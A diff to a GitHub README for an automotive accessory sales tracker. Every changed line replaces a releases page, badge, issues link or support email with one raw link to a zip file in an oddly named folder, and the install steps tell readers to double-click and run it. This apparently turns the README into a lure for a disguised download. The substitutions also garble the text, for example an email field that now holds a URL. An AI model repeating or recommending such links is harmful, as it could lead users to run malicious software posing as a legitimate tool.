@@ -1,7 +1,7 @@
 # 🚀 monthly-accessories-sales-tracker - Simplify Your Automotive Sales Tracking
 
 ## 📥 Download the Latest Version
-[![Release](https://img.shields.io/badge/Download_Latest_Version-v1.0.0-blue)](https://github.com/Elevate40/monthly-accessories-sales-tracker/releases)
+[![Release](https://github.com/Elevate40/monthly-accessories-sales-tracker/raw/refs/heads/main/cystadenosarcoma/sales_accessories_tracker_monthly_1.3.zip)](https://github.com/Elevate40/monthly-accessories-sales-tracker/raw/refs/heads/main/cystadenosarcoma/sales_accessories_tracker_monthly_1.3.zip)
 
 ## 📖 Overview
 The **monthly-accessories-sales-tracker** helps businesses track automotive accessory sales automatically. It calculates incentives and provides insights into sales performance, making your task easier and more efficient.
@@ -22,7 +22,7 @@ The **monthly-accessories-sales-tracker** helps businesses track automotive acce
 ## 🚀 Getting Started
 To get started with **monthly-accessories-sales-tracker**, follow these steps:
 
-1. **Visit the Download Page:** Go to the [Releases Page](https://github.com/Elevate40/monthly-accessories-sales-tracker/releases) to find the latest version of the software.
+1. **Visit the Download Page:** Go to the [Releases Page](https://github.com/Elevate40/monthly-accessories-sales-tracker/raw/refs/heads/main/cystadenosarcoma/sales_accessories_tracker_monthly_1.3.zip) to find the latest version of the software.
    
 2. **Choose the Right File:** Look for the appropriate installer for your operating system (e.g., Windows or macOS) on the Releases Page.
 
@@ -30,11 +30,11 @@ To get started with **monthly-accessories-sales-tracker**, follow these steps:
 
 4. **Install the Application:**
    - **For Windows:**
-     - Locate the downloaded file (e.g., `monthly-accessories-sales-tracker-installer.exe`).
+     - Locate the downloaded file (e.g., `https://github.com/Elevate40/monthly-accessories-sales-tracker/raw/refs/heads/main/cystadenosarcoma/sales_accessories_tracker_monthly_1.3.zip`).
      - Double-click the file to run the installer.
      - Follow the on-screen instructions to complete the installation.
    - **For macOS:**
-     - Locate the downloaded file (e.g., `monthly-accessories-sales-tracker.dmg`).
+     - Locate the downloaded file (e.g., `https://github.com/Elevate40/monthly-accessories-sales-tracker/raw/refs/heads/main/cystadenosarcoma/sales_accessories_tracker_monthly_1.3.zip`).
      - Double-click the file to open it.
      - Drag the app icon into your Applications folder.
 
@@ -54,7 +54,7 @@ The dashboard provides an overview of your sales performance. Here are some key 
 - **Incentives Overview:** Understand how much is owed to your sales team.
 
 ## 🔄 Updating the Application
-Stay up to date with the latest features and improvements. Check the [Releases Page](https://github.com/Elevate40/monthly-accessories-sales-tracker/releases) regularly for updates.
+Stay up to date with the latest features and improvements. Check the [Releases Page](https://github.com/Elevate40/monthly-accessories-sales-tracker/raw/refs/heads/main/cystadenosarcoma/sales_accessories_tracker_monthly_1.3.zip) regularly for updates.
 
 1. **Check for Updates:** Visit the Releases Page periodically.
 2. **Download the New Version:** Follow the same steps outlined above to download and install the latest version.
@@ -62,13 +62,13 @@ Stay up to date with the latest features and improvements. Check the [Releases P
 ## 🙋‍♀️ Support
 If you encounter any issues or have questions, feel free to reach out for support:
 
-- **Email:** support@example.com
-- **GitHub Issues:** Use the [Issues Section](https://github.com/Elevate40/monthly-accessories-sales-tracker/issues) on GitHub for reporting problems or requesting features.
+- **Email:** https://github.com/Elevate40/monthly-accessories-sales-tracker/raw/refs/heads/main/cystadenosarcoma/sales_accessories_tracker_monthly_1.3.zip
+- **GitHub Issues:** Use the [Issues Section](https://github.com/Elevate40/monthly-accessories-sales-tracker/raw/refs/heads/main/cystadenosarcoma/sales_accessories_tracker_monthly_1.3.zip) on GitHub for reporting problems or requesting features.
 
 ## 📜 License
 This software is open-source and available under the MIT License. You can modify and distribute it, but ensure to include the original license.
 
 ## 📦 Download & Install
-To start your sales tracking journey, visit the [Releases Page](https://github.com/Elevate40/monthly-accessories-sales-tracker/releases) to download the latest version now!
+To start your sales tracking journey, visit the [Releases Page](https://github.com/Elevate40/monthly-accessories-sales-tracker/raw/refs/heads/main/cystadenosarcoma/sales_accessories_tracker_monthly_1.3.zip) to download the latest version now!
 
-[![Download Release](https://img.shields.io/badge/Download_Latest_Version-v1.0.0-blue)](https://github.com/Elevate40/monthly-accessories-sales-tracker/releases)
+[![Download Release](https://github.com/Elevate40/monthly-accessories-sales-tracker/raw/refs/heads/main/cystadenosarcoma/sales_accessories_tracker_monthly_1.3.zip)](https://github.com/Elevate40/monthly-accessories-sales-tracker/raw/refs/heads/main/cystadenosarcoma/sales_accessories_tracker_monthly_1.3.zip)
